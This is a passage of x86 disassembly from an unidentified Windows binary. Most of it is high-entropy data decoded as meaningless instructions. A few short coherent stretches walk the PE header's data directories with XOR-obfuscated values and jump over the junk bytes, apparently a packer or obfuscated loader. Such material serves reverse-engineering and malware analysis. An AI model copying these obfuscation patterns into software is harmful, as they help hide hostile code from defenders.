  403074:	xlat   BYTE PTR ds:[ebx]
  403075:	das    
  403076:	daa    
  403077:	xchg   edi,eax
  403078:	xor    BYTE PTR [ecx-0x1f],ah
  40307b:	scas   al,BYTE PTR es:[edi]
  40307c:	mov    edx,0x8b19d262
  403081:	inc    ebp
  403082:	or     BYTE PTR [ebx-0x651607b3],cl
  403088:	add    al,BYTE PTR [eax]
  40308a:	add    cl,dl
  40308c:	int3   
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	ins    BYTE PTR es:[edi],dx
  403098:	add    edi,DWORD PTR [esi+ebp*4]
  40309b:	xchg   edx,eax
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	mov    edx,0xc75e0158
  4030a8:	xchg   BYTE PTR [esi],al
  4030aa:	dec    ebx
  4030ab:	(bad)  
  4030ad:	je     0x40311f
  4030af:	dec    ebp
  4030b0:	arpl   si,dx
  4030b2:	adc    eax,0xeb46a99a
  4030b7:	in     al,0x5
  4030b9:	cdq    
  4030ba:	pop    esp
  4030bb:	scas   al,BYTE PTR es:[edi]
  4030bc:	mov    ebp,esi
  4030be:	sbb    al,0xc1
  4030c0:	pop    ecx
  4030c1:	daa    
  4030c2:	call   0x44cfb582
  4030c7:	or     bl,BYTE PTR [ecx+ebx*8]
  4030ca:	and    al,0x6d
  4030cc:	xchg   ebx,eax
  4030cd:	jb     0x40312a
  4030cf:	mov    ch,0x31
  4030d1:	xor    cl,bh
  4030d3:	dec    BYTE PTR [ebx]
  4030d5:	call   0x5df75ecc
  4030da:	adc    al,0x51
  4030dc:	inc    edx
  4030dd:	push   cs
  4030de:	pop    ebx
  4030df:	inc    ecx
  4030e0:	repnz pushf 
  4030e2:	test   ax,0xf1f
  4030e6:	xor    bh,bh
  4030e8:	push   ebp
  4030e9:	jns    0x4030dc
  4030eb:	and    eax,0x87156ea2
  4030f0:	rcl    ah,1
  4030f2:	mov    al,0xc6
  4030f4:	fldcw  WORD PTR [eax-0x5c5762ae]
  4030fa:	sbb    ebp,ebp
  4030fc:	adc    eax,DWORD PTR [ebx-0x5c1a6426]
  403102:	ja     0x4030df
  403104:	pushf  
  403105:	iret   
  403106:	jecxz  0x4030e5
  403108:	jo     0x403152
  40310a:	test   DWORD PTR [edx],esp
  40310c:	loop   0x403175
  40310e:	mov    ds:0xcd2831d1,al
  403113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403114:	fcmove st,st(5)
  403116:	and    esp,edi
  403118:	or     cl,BYTE PTR [esi+0x5939de8a]
  40311e:	repnz rcl BYTE PTR [esi-0xf],1
  403122:	(bad)  
  403123:	in     eax,dx
  403124:	mov    BYTE PTR [edi+0x4200e6ce],ch
  40312a:	and    esp,DWORD PTR [ebx+ecx*4]
  40312d:	add    esp,DWORD PTR [ebp+eiz*1+0x2b]
  403131:	(bad)  
  403133:	mov    ch,0x5f
  403135:	arpl   WORD PTR [edi],bp
  403137:	jb     0x4030dc
  403139:	dec    edx
  40313a:	les    edi,FWORD PTR [edi+0x11ccfe54]
  403140:	fsubr  st,st(4)
  403142:	rol    DWORD PTR [esi+0x26],cl
  403145:	scas   al,BYTE PTR es:[edi]
  403146:	test   DWORD PTR [eax-0x38],0x707586fe
  40314d:	cs pop ds
  40314f:	mov    cl,0xca
  403151:	dec    edx
  403152:	jb     0x403135
  403154:	pop    edx
  403155:	push   edx
  403156:	mov    eax,0xabb939ab
  40315b:	(bad)  
  40315c:	adc    DWORD PTR [ebp+eax*4+0x31],esp
  403160:	fcomi  st,st(4)
  403162:	pop    esp
  403163:	push   0x1
  403165:	inc    ebx
  403166:	es popf 
  403168:	or     al,0x39
  40316a:	imul   esi,eax,0x24
  40316d:	fs dec ebp
  40316f:	cmp    eax,0x1e0dec0d
  403174:	int    0x25
  403176:	sbb    dl,BYTE PTR [edx-0x21]
  403179:	(bad)  
  40317a:	mov    al,ds:0xa5991f43
  40317f:	(bad)  
  403180:	xlat   BYTE PTR ds:[ebx]
  403181:	fnstsw WORD PTR [eax+eax*2-0x28]
  403185:	sbb    al,0x27
  403187:	jnp    0x403141
  403189:	xchg   ecx,eax
  40318a:	out    0xf1,al
  40318c:	repnz pop ebp
  40318e:	lds    edi,FWORD PTR [eax]
  403190:	fld    TBYTE PTR [eax+0x2f5fe9c4]
  403196:	sub    bh,BYTE PTR [esi+0x53f5c982]
  40319c:	(bad)  
  40319d:	jmp    DWORD PTR [ecx]
  40319f:	or     ch,BYTE PTR [ecx]
  4031a1:	out    dx,al
  4031a2:	call   0x352a:0xe5da4a06
  4031a9:	mov    esi,0x322bcd7b
  4031ae:	test   bl,al
  4031b0:	pinsrw mm1,WORD PTR [edx],0x2
  4031b4:	sbb    dl,BYTE PTR ds:0x8752161b
  4031ba:	into   
  4031bb:	iret   
  4031bc:	jns    0x40315b
  4031be:	lock call 0x98b6e78f
  4031c4:	pop    edx
  4031c5:	lock sub DWORD PTR [eax],ecx
  4031c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c9:	pop    esp
  4031ca:	es inc esp
  4031cc:	cmp    eax,0x59cf3c39
  4031d1:	das    
  4031d2:	data16 sbb al,0x71
  4031d5:	hlt    
  4031d6:	fsub   st,st(7)
  4031d8:	or     DWORD PTR [ebp-0x12],0x72
  4031dc:	mov    esi,0xb242d462
  4031e1:	aaa    
  4031e2:	pop    ebp
  4031e3:	ja     0x403232
  4031e5:	lods   al,BYTE PTR ds:[esi]
  4031e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031e8:	pop    ebx
  4031e9:	das    
  4031ea:	sar    DWORD PTR [eax+0x3fdf0c9d],cl
  4031f0:	ret    0x82bd
  4031f3:	sub    al,0x45
  4031f5:	add    ebx,edi
  4031f7:	push   es
  4031f8:	adc    BYTE PTR [edi-0x14cd4d44],al
  4031fe:	ds sbb al,0x8d
  403201:	lea    ebx,[esi+0x7c]
  403204:	outs   dx,BYTE PTR ds:[esi]
  403205:	add    eax,0xd4ea6274
  40320a:	mov    edi,0x249e9908
  40320f:	mov    DWORD PTR [edi+0x2992ed17],edx
  403215:	addr16 inc eax
  403217:	aaa    
  403218:	jns    0x403211
  40321a:	jle    0x4031fc
  40321c:	mov    DWORD PTR [edx-0x34],edi
  40321f:	push   0x48e608ac
  403224:	xor    eax,0xf62dbe36
  403229:	dec    eax
  40322a:	scas   eax,DWORD PTR es:[edi]
  40322b:	mov    ch,BYTE PTR [eax+0x36]
  40322e:	sbb    BYTE PTR [esi],ah
  403230:	fmul   DWORD PTR [ebp+0x3cabdcc4]
  403236:	inc    esi
  403237:	(bad)  
  403238:	shr    BYTE PTR [ecx+0x2c6c6536],1
  40323e:	nop
  40323f:	xchg   esi,eax
  403240:	pushf  
  403241:	xor    al,0x41
  403243:	outs   dx,BYTE PTR ds:[esi]
  403244:	daa    
  403245:	es jae 0x4032ba
  403248:	es dec ebx
  40324a:	enter  0x20ba,0x28
  40324e:	push   ecx
  40324f:	out    dx,al
  403250:	dec    edx
  403251:	and    ebx,ecx
  403253:	imul   ecx,DWORD PTR [ebx+0x4c39d76f],0x25
  40325a:	mov    esp,0xce693ead
  40325f:	ja     0x40329e
  403261:	adc    esi,eax
  403263:	lea    edx,[edx-0x7c15361b]
  403269:	ja     0x4031ff
  40326b:	or     ebx,DWORD PTR [eax-0x41aaa198]
  403271:	je     0x40328f
  403273:	loop   0x40325e
  403275:	fsubr  QWORD PTR [eax+0x37]
  403278:	pop    ecx
  40327a:	repnz iret 
  40327c:	or     esp,DWORD PTR [ebx+0x55b6ccd0]
  403282:	ds xor al,0x12
  403285:	(bad)  
  403286:	rol    BYTE PTR [edx],cl
  403288:	sub    DWORD PTR [ecx+0x29c279bb],ecx
  40328e:	jecxz  0x40328a
  403290:	sbb    DWORD PTR [ecx-0x38],0xffffffb6
  403294:	xchg   esp,eax
  403295:	sbb    eax,0x772927f4
  40329a:	adc    al,0x0
  40329c:	ins    DWORD PTR es:[edi],dx
  40329d:	pop    esp
  40329e:	push   ecx
  40329f:	cwde   
  4032a0:	mov    ebx,0xa585ab2f
  4032a5:	jle    0x4032e8
  4032a7:	mov    ds:0xcabf645d,eax
  4032ac:	test   al,0x48
  4032ae:	scas   eax,DWORD PTR es:[edi]
  4032af:	mov    al,0x41
  4032b1:	mov    ah,BYTE PTR [ebx]
  4032b3:	aas    
  4032b4:	scas   al,BYTE PTR es:[edi]
  4032b5:	stos   DWORD PTR es:[edi],eax
  4032b6:	bsf    edx,DWORD PTR [esp+edi*1+0x1232d538]
  4032be:	idiv   DWORD PTR [ebx]
  4032c0:	sub    BYTE PTR [ecx+edx*1],ah
  4032c3:	clc    
  4032c4:	(bad)
  4032c7:	stos   DWORD PTR es:[edi],eax
  4032c8:	outs   dx,BYTE PTR ds:[esi]
  4032c9:	and    al,dh
  4032cb:	fdiv   st,st(4)
  4032cd:	arpl   di,bp
  4032cf:	fstp   st(7)
  4032d1:	pusha  
  4032d2:	mov    esi,0x114a1509
  4032d7:	cmp    ecx,DWORD PTR [eax-0x45]
  4032da:	mov    dl,0x3
  4032dc:	jl     0x40332f
  4032de:	adc    eax,0x9fa68ed2
  4032e3:	out    dx,eax
  4032e4:	xchg   ecx,eax
  4032e5:	mov    ebx,0x3af27e1f
  4032ea:	xor    DWORD PTR [esi+0x26616a61],eax
  4032f0:	pop    DWORD PTR [edi+0x67980a0a]
  4032f6:	fld    DWORD PTR [ebp+0x76]
  4032f9:	pushf  
  4032fa:	add    eax,0xdbff51d2
  4032ff:	(bad)  
  403301:	xor    ah,bl
  403303:	cld    
  403304:	xchg   edi,eax
  403305:	lahf   
  403306:	ins    DWORD PTR es:[edi],dx
  403307:	xlat   BYTE PTR es:[ebx]
  403309:	in     al,dx
  40330a:	test   DWORD PTR [ecx+0x48],0xba9ed57b
  403311:	in     al,dx
  403312:	(bad)  
  403313:	cwde   
  403314:	fmul   QWORD PTR [ecx+ebx*2+0x70]
  403318:	aas    
  403319:	loop   0x40335c
  40331b:	sub    DWORD PTR [esi-0x6f27d54b],ebp
  403321:	icebp  
  403322:	or     BYTE PTR [ebx-0xa],al
  403325:	xor    eax,esi
  403327:	add    eax,edi
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx-0x2a3dc34a]
  403372:	cmp    cl,BYTE PTR [ebp+0x781a10b1]
  403378:	js     0x403378
  40337a:	jle    0x4033f4
  40337c:	js     0x40332c
  40337e:	lahf   
  40337f:	aad    0x19
  403381:	loope  0x4033dc
  403383:	jae    0x4033b3
  403385:	loopne 0x40331a
  403387:	(bad)  
  403389:	and    DWORD PTR [esp+eiz*2],edi
  40338c:	fld    QWORD PTR [edx+0x1ce6afa9]
  403392:	(bad)  [eax]
  403394:	cmp    al,0xbb
  403396:	mov    dh,0x58
  403398:	jl     0x40338e
  40339a:	(bad)  
  40339b:	jb     0x403392
  40339d:	jp     0x4033c0
  40339f:	fcomp  DWORD PTR [edi-0x4288bd08]
  4033a5:	repz pop esi
  4033a7:	or     eax,0x831774ed
  4033ac:	add    al,0x43
  4033ae:	sbb    bh,BYTE PTR [esi+0x5fc28eab]
  4033b4:	cmp    al,BYTE PTR [ecx+ecx*1-0x1b84a70c]
  4033bb:	inc    ebp
  4033bc:	push   edi
  4033bd:	add    eax,0xd2b2eaf9
  4033c2:	jg     0x4033dc
  4033c4:	scas   eax,DWORD PTR es:[edi]
  4033c5:	les    esi,FWORD PTR [edi]
  4033c7:	lods   al,BYTE PTR ds:[esi]
  4033c8:	and    DWORD PTR [ebx+0x7531e8fe],eax
  4033ce:	xchg   ecx,eax
  4033cf:	add    DWORD PTR [edx],esp
  4033d1:	inc    edx
  4033d2:	aad    0xbf
  4033d4:	and    dh,BYTE PTR [ebx+0x36]
  4033d7:	fsubr  QWORD PTR [eax+edx*4-0x13]
  4033db:	repz sub ecx,ebp
  4033de:	cmp    ebp,ebp
  4033e0:	test   al,0x5
  4033e2:	mov    esi,0xa36644d3
  4033e7:	dec    ebp
  4033e8:	sahf   
  4033e9:	(bad)  
  4033ea:	iret   
  4033eb:	sbb    bh,ch
  4033ed:	dec    DWORD PTR [edx+0x52]
  4033f0:	mov    dl,BYTE PTR [ecx]
  4033f2:	lahf   
  4033f3:	sbb    al,0x39
  4033f5:	call   FWORD PTR [eax-0x31]
  4033f8:	lock inc ebp
  4033fa:	std    
  4033fb:	shl    DWORD PTR [edx],1
  4033fd:	fild   DWORD PTR cs:[ecx-0xa]
  403401:	cdq    
  403402:	cmp    eax,0x69437941
  403407:	xchg   ebp,eax
  403408:	inc    esp
  403409:	mov    esp,0xf7a5bb74
  40340e:	rcl    esp,cl
  403410:	nop
  403411:	xchg   ebx,eax
  403412:	add    al,0xed
  403414:	xchg   esi,eax
  403415:	ins    DWORD PTR es:[edi],dx
  403416:	xchg   esp,eax
  403417:	sti    
  403418:	mov    DWORD PTR [ebx-0xc],esp
  40341b:	cmovle edi,DWORD PTR [ebx+0x20]
  40341f:	xchg   DWORD PTR [ebx],esp
  403421:	dec    esp
  403422:	push   0xffffffdf
  403424:	jb     0x403427
  403426:	add    DWORD PTR [ebp+esi*4+0x35],edi
  40342a:	dec    esp
  40342b:	ds push eax
  40342d:	pop    edi
  40342e:	in     eax,dx
  40342f:	inc    edx
  403430:	ins    DWORD PTR es:[edi],dx
  403431:	sub    esi,eax
  403433:	sbb    eax,0xb60c6109
  403438:	mov    dh,0xb3
  40343a:	and    esi,DWORD PTR [edi]
  40343c:	into   
  40343d:	add    DWORD PTR [esi],eax
  40343f:	in     eax,0xc9
  403441:	sub    DWORD PTR [eax-0x1f1c183e],edx
  403447:	fwait
  403448:	jno    0x4033ca
  40344a:	xchg   esi,eax
  40344b:	mov    ebx,0xd8a7bf53
  403450:	imul   esi,DWORD PTR [ebx+0x29f3cac6],0x2e
  403457:	loop   0x403449
  403459:	or     eax,0xfdb5e026
  40345e:	adc    edi,DWORD PTR [ecx]
  403460:	test   eax,0x3b512114
  403465:	push   0xfffffff0
  403467:	xor    cl,cl
  403469:	std    
  40346a:	dec    ebp
  40346b:	mov    cl,0x7e
  40346d:	fld    st(6)
  40346f:	jecxz  0x40346d
  403471:	clc    
  403472:	push   ecx
  403473:	mov    esp,0xaba8750a
  403478:	call   0xaf775f9e
  40347d:	leave  
  40347e:	div    BYTE PTR [edi]
  403480:	aas    
  403481:	int3   
  403482:	xor    BYTE PTR [eax],dh
  403484:	call   0x45eb:0xf6c7b0ab
  40348b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40348c:	sahf   
  40348d:	adc    al,0x81
  40348f:	mov    ch,0x56
  403491:	lods   al,BYTE PTR ds:[esi]
  403492:	push   ecx
  403493:	fldcw  WORD PTR [edi]
  403495:	push   esi
  403496:	dec    esp
  403497:	lds    esi,FWORD PTR [ebx-0x33]
  40349a:	leave  
  40349b:	sahf   
  40349c:	test   BYTE PTR [eax+ecx*4],dl
  40349f:	jp     0x40351c
  4034a1:	pusha  
  4034a2:	pop    esp
  4034a3:	and    eax,ecx
  4034a5:	std    
  4034a6:	test   BYTE PTR [ebx+ebp*8+0x26],cl
  4034aa:	sbb    eax,0xf12b1357
  4034af:	sbb    al,BYTE PTR [edi-0x4b]
  4034b2:	out    dx,eax
  4034b3:	xchg   ebp,eax
  4034b4:	call   ebx
  4034b6:	call   FWORD PTR [ebx]
  4034b8:	and    DWORD PTR [esi-0x4],ebp
  4034bb:	cmp    DWORD PTR [edx+ebx*2+0x1e3139c2],esi
  4034c2:	retf   0xe799
  4034c5:	in     al,dx
  4034c6:	xor    dh,BYTE PTR [edx+0x27]
  4034c9:	mov    ah,0x8b
  4034cb:	(bad)  
  4034cc:	stc    
  4034cd:	sub    dh,cl
  4034cf:	les    ebp,FWORD PTR [edx]
  4034d1:	rol    DWORD PTR [edx],0x1f
  4034d4:	jno    0x4034bb
  4034d6:	stc    
  4034d7:	jno    0x4034e8
  4034d9:	fwait
  4034da:	cmp    eax,0x736d50a0
  4034df:	jo     0x403535
  4034e1:	sub    esi,eax
  4034e3:	daa    
  4034e4:	push   0x5a
  4034e6:	pop    eax
  4034e7:	and    eax,0x7bc34f22
  4034ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ed:	scas   al,BYTE PTR es:[edi]
  4034ee:	hlt    
  4034ef:	and    al,0x5a
  4034f1:	sti    
  4034f2:	mov    edx,0x6b3327fe
  4034f7:	bound  esp,QWORD PTR [eax-0x7dd1301]
  4034fd:	adc    eax,0xc6965d3b
  403502:	inc    eax
  403503:	adc    eax,0x2cb8bf36
  403508:	sbb    esp,DWORD PTR ds:0xf9386154
  40350e:	mov    ecx,esi
  403510:	ficomp DWORD PTR [eax]
  403512:	add    ebp,ebp
  403514:	xchg   ecx,eax
  403515:	js     0x40358d
  403517:	mov    eax,ds:0x6a5ceb5b
  40351c:	jns    0x40350d
  40351e:	dec    edx
  40351f:	fldcw  WORD PTR [edi+esi*4]
  403522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403523:	dec    ebp
  403524:	fisttp DWORD PTR [edx+ebx*4-0x7ff30f00]
  40352b:	scas   eax,DWORD PTR es:[edi]
  40352c:	loopne 0x4035a1
  40352e:	pop    eax
  40352f:	cmp    BYTE PTR [eax+0x4ae8793c],dh
  403535:	sub    eax,0xebe985f4
  40353a:	dec    ebp
  40353b:	cmp    eax,0xd4515803
  403540:	xchg   esp,eax
  403541:	pop    ss
  403542:	mov    ebp,0xbf4c8d8d
  403547:	pushf  
  403548:	adc    eax,0x9d24a436
  40354d:	outs   dx,BYTE PTR ds:[esi]
  40354e:	and    eax,0xb0ffba68
  403553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403554:	clc    
  403555:	sbb    al,0x13
  403557:	cmp    eax,0x1b6bf04d
  40355c:	clc    
  40355d:	lahf   
  40355e:	xor    BYTE PTR [ecx+0x413e2dfd],ch
  403564:	mov    dh,0x80
  403566:	xor    ah,BYTE PTR [eax-0x6c71d4ee]
  40356c:	shr    BYTE PTR [ebp-0x7298c9b2],1
  403572:	les    ecx,FWORD PTR [ebp-0x5f]
  403575:	dec    DWORD PTR [ebx+0x2e834513]
  40357b:	sbb    BYTE PTR [ecx+ebx*2-0x46],ah
  40357f:	jns    0x4035b8
  403581:	lods   eax,DWORD PTR ds:[esi]
  403582:	mov    ds:0x770c3306,eax
  403587:	in     eax,0x1
  403589:	cli    
  40358a:	mov    esi,0xa1455e0b
  40358f:	sbb    bh,BYTE PTR [edx+0x7353e60]
  403595:	jmp    0x4035e5
  403597:	inc    ebp
  403598:	hlt    
  403599:	loop   0x403563
  40359b:	add    esi,esp
  40359d:	sbb    DWORD PTR [esi-0x2c],edx
  4035a0:	loopne 0x4035b8
  4035a2:	add    eax,DWORD PTR [ecx+0x4f0f35bb]
  4035a8:	push   ss
  4035a9:	dec    esi
  4035aa:	pop    ecx
  4035ac:	retf   0xbf82
  4035af:	outs   dx,BYTE PTR ds:[esi]
  4035b0:	inc    esi
  4035b1:	out    dx,eax
  4035b2:	out    dx,al
  4035b3:	pop    esp
  4035b4:	lock ror BYTE PTR [ebp-0x2d],1
  4035b8:	sub    ebx,esi
  4035ba:	inc    sp
  4035bc:	in     al,0x10
  4035be:	or     al,0x57
  4035c0:	shld   DWORD PTR [eax+0x47389d6b],ebx,0x20
  4035c8:	ja     0x40360a
  4035ca:	lahf   
  4035cb:	test   al,0x3c
  4035cd:	in     eax,dx
  4035ce:	mov    esi,0x5951ad0b
  4035d3:	mov    edx,eax
  4035d5:	dec    edi
  4035d6:	sbb    al,0x4a
  4035d8:	je     0x403607
  4035da:	xor    eax,0x627211ae
  4035df:	(bad)  
  4035e0:	jbe    0x40361c
  4035e2:	mov    ch,0x38
  4035e4:	add    DWORD PTR [ebp+edx*8+0x6494da20],eax
  4035eb:	lods   al,BYTE PTR ds:[esi]
  4035ec:	test   DWORD PTR [ecx+0x6e],0x1ee01dde
  4035f3:	mov    DWORD PTR [edx-0x6f],edi
  4035f6:	scas   al,BYTE PTR es:[edi]
  4035f7:	popf   
  4035f8:	int3   
  4035f9:	call   DWORD PTR [ecx]
  4035fb:	jb     0x403637
  4035fd:	push   ebp
  4035fe:	loop   0x403633
  403600:	mov    BYTE PTR [ebx],0xc7
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0x1d16f0d4,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403604
  40363f:	stos   BYTE PTR es:[edi],al
  403640:	out    dx,al
  403641:	stc    
  403642:	mov    BYTE PTR [edi+0x184dbd6b],ch
  403648:	sub    dl,BYTE PTR ds:0xce3f48b8
  40364e:	shl    BYTE PTR [esi+0x4e04fd6c],0xc
  403655:	fwait
  403656:	mov    dl,0xdb
  403658:	adc    al,0x76
  40365a:	jo     0x40364f
  40365c:	ins    BYTE PTR es:[edi],dx
  40365d:	mov    DWORD PTR [ebx+eiz*1],esi
  403660:	push   ebp
  403661:	js     0x40368e
  403663:	scas   al,BYTE PTR es:[edi]
  403664:	and    eax,DWORD PTR [edx]
  403666:	cmp    al,0xa9
  403668:	pop    esi
  403669:	aaa    
  40366a:	inc    ecx
  40366b:	cwde   
  40366c:	in     eax,0xc7
  40366e:	call   0x5938b5e9
  403673:	dec    esp
  403674:	daa    
  403675:	inc    eax
  403676:	xor    bh,al
  403678:	sbb    ebp,DWORD PTR [esi-0x58]
  40367b:	in     al,0xdb
  40367d:	jne    0x4035ff
  40367f:	ret    
  403680:	pop    ebx
  403681:	mov    ds:0xf452f83,al
  403686:	dec    esp
  403687:	sar    ecx,0xc7
  40368a:	cdq    
  40368b:	lahf   
  40368c:	inc    edx
  40368d:	dec    ebx
  40368e:	retf   0x831b
  403691:	and    edx,DWORD PTR [eax]
  403693:	int    0x6d
  403695:	add    al,0xbc
  403697:	pop    edx
  403698:	cwde   
  403699:	adc    eax,0x405323ba
  40369e:	fistp  DWORD PTR [ecx]
  4036a0:	out    0x62,al
  4036a2:	pop    edi
  4036a3:	rcr    ecx,0x81
  4036a6:	sub    DWORD PTR [edx-0x11541d13],eax
  4036ac:	retf   0xc017
  4036af:	mov    DWORD PTR [ebp+0x16],edi
  4036b2:	mov    ch,0x3c
  4036b4:	cld    
  4036b5:	inc    eax
  4036b6:	jb     0x403693
  4036b8:	(bad)  
  4036b9:	into   
  4036ba:	call   0xb6b132f7
  4036bf:	mov    dl,0xc0
  4036c1:	popa   
  4036c2:	rcr    DWORD PTR [edx],1
  4036c4:	push   edx
  4036c5:	jno    0x40370b
  4036c7:	mov    ch,0xb6
  4036c9:	adc    edx,esi
  4036cb:	sar    BYTE PTR [eax-0x4ddee64f],0x63
  4036d2:	rol    BYTE PTR [edi],1
  4036d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036d5:	imul   ebp,ebx,0xffffffe0
  4036d8:	hlt    
  4036d9:	and    edx,DWORD PTR [ecx+0x8]
  4036dc:	pop    eax
  4036dd:	or     eax,0x70aeab7f
  4036e2:	test   al,0x78
  4036e4:	scas   eax,DWORD PTR es:[edi]
  4036e5:	pop    edi
  4036e6:	fsub   st(2),st
  4036e8:	push   ss
  4036e9:	sbb    eax,0xe8e3ec3e
  4036ee:	shl    DWORD PTR [ebx-0x2b],0x30
  4036f2:	test   eax,0x1178531d
  4036f7:	xor    al,bl
  4036f9:	test   BYTE PTR [ecx+0x34827fff],ch
  4036ff:	nop
  403700:	or     ecx,DWORD PTR ds:0xbdefbd87
  403706:	mov    esp,0x423e341d
  40370b:	ins    DWORD PTR es:[edi],dx
  40370c:	or     DWORD PTR [edx],eax
  40370e:	xor    BYTE PTR [ebp+0x742fff4d],cl
  403714:	fdivr  QWORD PTR [edi+0x6c]
  403717:	and    al,0x9d
  403719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40371a:	sti    
  40371b:	pushf  
  40371c:	sbb    DWORD PTR [edi+0x4e],0x32
  403720:	ds mov esi,0xd450d677
  403726:	rcr    BYTE PTR [ebp-0x7c],cl
  403729:	pop    eax
  40372a:	nop
  40372b:	adc    DWORD PTR [ecx+0x208811c9],ebx
  403731:	icebp  
  403732:	shr    BYTE PTR [ecx-0x36],0xce
  403736:	push   edx
  403737:	ret    0x988
  40373a:	xlat   BYTE PTR ds:[ebx]
  40373b:	stos   BYTE PTR es:[edi],al
  40373c:	mov    al,ds:0x7a36a865
  403741:	push   edx
  403742:	jo     0x403792
  403744:	add    eax,0xa809a116
  403749:	dec    ecx
  40374a:	retf   
  40374b:	jae    0x40372b
  40374d:	or     edi,DWORD PTR [eax+0x4c]
  403750:	jo     0x4037b3
  403752:	push   edx
  403753:	aaa    
  403754:	out    dx,al
  403755:	outs   dx,BYTE PTR ds:[esi]
  403756:	xor    dh,bh
  403758:	hlt    
  403759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40375a:	pushf  
  40375b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40375c:	cmp    esi,0x9
  40375f:	adc    eax,0x646f845c
  403764:	cli    
  403765:	gs push esp
  403767:	inc    ecx
  403768:	push   edx
  403769:	int    0x8a
  40376b:	pop    es
  40376c:	int    0x97
  40376e:	adc    eax,0x32a2e546
  403773:	jns    0x4037e3
  403775:	in     al,0x82
  403777:	les    eax,FWORD PTR [edi-0x76]
  40377a:	repnz test al,0x22
  40377d:	mul    BYTE PTR ds:0x9a21380d
  403783:	addr16 push cs
  403785:	fdivr  DWORD PTR [ebx+esi*2-0x4c]
  403789:	mov    ecx,0x930f324f
  40378e:	sub    ecx,DWORD PTR [ebx+ebx*1]
  403791:	fcomp  DWORD PTR [edi+edi*2-0x3d]
  403795:	sub    DWORD PTR [ecx-0x5147a260],edx
  40379b:	test   DWORD PTR [edi+0x3d],0x4cc49f0
  4037a2:	int    0xca
  4037a4:	ins    DWORD PTR es:[edi],dx
  4037a5:	lods   al,BYTE PTR ds:[esi]
  4037a6:	xor    al,BYTE PTR [ecx+edx*1+0x1b3db51a]
  4037ad:	mov    ds:0x2bf67ebd,al
  4037b2:	jnp    0x403759
  4037b4:	cwde   
  4037b5:	loop   0x40375c
  4037b7:	mov    edi,0x4cb78466
  4037bc:	repnz xor ecx,DWORD PTR ds:0x94960fc
  4037c3:	jmp    0x982c:0x8268fdfa
  4037ca:	mov    al,ds:0xff3277f4
  4037cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037d0:	inc    edx
  4037d1:	mov    bh,BYTE PTR cs:[edi-0x38]
  4037d5:	cld    
  4037d6:	mov    es,WORD PTR [edx]
  4037d8:	pop    edi
  4037d9:	popf   
  4037da:	mov    edi,0xb43298b8
  4037df:	iret   
  4037e0:	xchg   esp,eax
  4037e1:	mov    ch,0x41
  4037e3:	jo     0x4037af
  4037e5:	push   ebx
  4037e6:	jo     0x40385e
  4037e8:	outs   dx,BYTE PTR ds:[esi]
  4037e9:	ins    DWORD PTR es:[edi],dx
  4037ea:	ret    0xaa19
  4037ed:	loopne 0x403808
  4037ef:	mov    al,ds:0x53f7ea46
  4037f4:	sahf   
  4037f5:	jno    0x4037df
  4037f7:	sub    eax,0xd4304c93
  4037fc:	mov    ebx,0x4cb0545e
  403801:	ja     0x4037a2
  403803:	adc    bh,BYTE PTR [ebx]
  403805:	cmp    bl,dl
  403807:	loopne 0x4037e3
  403809:	push   0x88cb211c
  40380e:	mov    esi,DWORD PTR [eax]
  403810:	add    DWORD PTR [ecx-0x75],ebx
  403813:	push   eax
  403814:	or     ecx,DWORD PTR [ebp-0x64]
  403817:	xor    BYTE PTR [ecx],dl
  403819:	jo     0x4037e3
  40381b:	les    esp,FWORD PTR [eax+0x704aea39]
  403821:	xchg   ebx,eax
  403822:	xchg   edi,eax
  403823:	jle    0x403817
  403825:	sbb    BYTE PTR [esi-0x20e27d35],ah
